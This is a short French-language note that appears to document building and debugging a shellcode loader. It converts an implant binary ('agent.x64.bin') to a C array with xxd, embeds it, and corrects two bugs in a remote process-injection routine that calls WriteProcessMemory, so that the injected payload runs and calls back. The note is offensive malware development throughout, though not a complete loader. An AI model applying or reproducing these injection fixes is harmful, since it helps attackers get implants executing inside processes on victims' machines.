
```bash
sudo apt install xxd
xxd -i agent.x64.bin > shellcode.h
xxd -i agent.x64.bin | tr -s ' \n' ' ' > shellcode.h
```

Sortie :

```cpp
unsigned char agent_x64_bin[] = { 0x4d, 0x5a, ... };
unsigned int agent_x64_bin_len = 1234;
```

Intégration pratique :

```cpp
#include "shellcode.h"

unsigned char* shellcode = agent_x64_bin;
unsigned int shellcode_len = agent_x64_bin_len;
```

Remplacements :

** `sizeof` sur un pointeur**
```cpp
unsigned char* shellcode = agent_x64_bin;
sizeof(shellcode); // retourne 8, taille d'un pointeur x64

// sizeof(shellcode) -> shellcode_len
```

Quand `shellcode` est un pointeur, `sizeof` donne la taille du pointeur et non du buffer. Il faut utiliser `agent_x64_bin_len` fourni par `xxd`.

**`&shellcode` dans WriteProcessMemory**
```cpp
&shellcode // adresse du pointeur lui-même, pas des données
shellcode  // adresse des données, c'est ce qu'il faut

// &shellcode -> shellcode
```

`WriteProcessMemory` écrivait l'adresse du pointeur (8 bytes) dans la mémoire allouée au lieu du shellcode réel. Le thread s'exécutait sur des données invalides, aucun callback.
